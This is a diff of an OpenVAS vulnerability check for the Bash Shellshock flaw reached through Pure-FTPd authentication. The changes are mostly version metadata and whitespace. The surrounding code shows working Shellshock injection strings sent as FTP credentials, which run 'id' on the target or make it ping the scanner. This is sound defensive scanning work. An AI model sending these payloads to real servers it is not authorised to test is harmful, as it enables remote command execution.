@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_pure-ftpd_remote_cmd_exec_vuln.nasl 9438 2018-04-11 10:28:36Z cfischer $
+# $Id: gb_bash_shellshock_pure-ftpd_remote_cmd_exec_vuln.nasl 11108 2018-08-24 14:27:07Z mmartin $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105094");
-  script_version("$Revision: 9438 $");
-  script_cve_id("CVE-2014-6271","CVE-2014-6278");
+  script_version("$Revision: 11108 $");
+  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-11 12:28:36 +0200 (Wed, 11 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");
 
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)");
@@ -84,7 +84,7 @@ id_users = make_list( '() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;',
                       '() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }' );
 
 foreach id_user ( id_users )
-{  
+{
   id_pass = id_user;
 
   soc = open_sock_tcp( port );
@@ -102,15 +102,15 @@ foreach id_user ( id_users )
   {
     VULN = TRUE;
     break;
-  }  
+  }
 
-}  
+}
 
 if( ! VULN )
 {
   str = '_OpenVAS_' + rand_str( length:6 );
   pattern = hexstr( str );
-  p_users = make_list( 
+  p_users = make_list(
                       '() { :; }; export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host(),
                       '{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host() + '; }'
                      );
@@ -127,8 +127,8 @@ if( ! VULN )
     recv = recv( socket:soc, length:1024 );
     send(socket:soc, data:'PASS ' + pass + '\r\n');
 
-    res = send_capture( socket:soc, 
-                        data:"", 
+    res = send_capture( socket:soc,
+                        data:"",
                         pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() )
                        );
     close( soc );
@@ -136,19 +136,19 @@ if( ! VULN )
     if( ! res  ) continue;
 
     data = get_icmp_element( icmp:res, element:"data" );
-    
+
     if( str >< data)
     {
       VULN = TRUE;
       break;
     }
   }
-}  
+}
 
 if( VULN )
 {
   security_message( port:port );
   exit( 0 );
 }
-  
+
 exit( 99 );
